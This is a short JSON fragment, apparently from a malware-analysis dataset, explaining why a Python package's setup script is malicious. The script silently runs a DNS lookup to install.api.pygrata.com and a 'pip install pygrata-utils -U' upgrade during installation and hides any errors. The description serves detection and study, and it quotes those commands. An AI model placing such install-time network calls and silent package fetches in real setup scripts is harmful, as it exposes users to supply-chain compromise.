      "malicious_behavior": "The code executes shell commands during the package installation process without user interaction or consent. Specifically, it runs 'dig @1.1.1.1 install.api.pygrata.com' and then attempts to upgrade the 'pygrata-utils' package via 'pip install pygrata-utils -U'. Executing subprocess commands in a setup script is a known vector for supply chain attacks, enabling remote code execution on the user's system during installation. The use of subprocess.getoutput to run network-related commands and install or upgrade packages silently, combined with the try-except block that suppresses any errors, indicates an attempt to evade detection and perform unauthorized actions. This behavior aligns with multiple critical risk indicators for malicious activity, including code execution during installation, network communication to potentially attacker-controlled domains, and lack of user notification or consent."
